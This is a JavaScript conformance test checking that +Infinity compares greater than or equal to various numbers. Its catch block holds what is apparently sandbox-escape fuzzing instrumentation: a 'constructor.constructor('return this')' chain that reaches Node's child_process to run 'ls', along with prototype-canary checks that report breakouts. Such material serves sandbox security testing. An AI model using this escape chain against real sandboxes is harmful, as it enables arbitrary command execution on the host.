try {
    if (Number.POSITIVE_INFINITY >= 0 !== true) {
        $ERROR('#1: (+Infinity >= 0) === true');
    }
    if (Number.POSITIVE_INFINITY >= 1.1 !== true) {
        $ERROR('#2: (+Infinity >= 1.1) === true');
    }
    if (Number.POSITIVE_INFINITY >= -1.1 !== true) {
        $ERROR('#3: (+Infinity >= -1.1) === true');
    }
    if (Number.POSITIVE_INFINITY >= Number.NEGATIVE_INFINITY !== true) {
        $ERROR('#4: (+Infinity >= -Infinity) === true');
    }
    if (Number.POSITIVE_INFINITY >= Number.MAX_VALUE !== true) {
        $ERROR('#5: (+Infinity >= Number.MAX_VALUE) === true');
    }
    if (Number.POSITIVE_INFINITY >= Number.MIN_VALUE !== true) {
        $ERROR('#6: (+Infinity >= Number.MIN_VALUE) === true');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}